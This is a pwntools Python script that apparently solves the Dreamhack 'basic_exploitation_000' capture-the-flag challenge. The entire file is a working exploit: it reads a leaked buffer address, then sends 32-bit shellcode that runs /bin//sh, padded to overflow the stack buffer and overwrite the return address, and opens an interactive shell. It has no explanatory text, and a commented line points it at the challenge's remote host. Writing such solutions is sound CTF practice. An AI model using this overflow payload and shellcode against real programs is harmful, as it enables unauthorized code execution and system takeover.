from pwn import *

context.update(log_level = 'debug')
p = process('basic_exploitation_000')
#p = remote('host1.dreamhack.games', 8591)

_recv = p.recvrepeat(1)
addr_buf = int(_recv.split('(')[1].split(')')[0], 16)
log.info('addr_buf : ' + hex(addr_buf))
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x34\xff\x2c\xf4\xcd\x80"
p.sendline(shell + 'a'*(0x80+4 - len(shell)) + p32(addr_buf))

p.interactive()



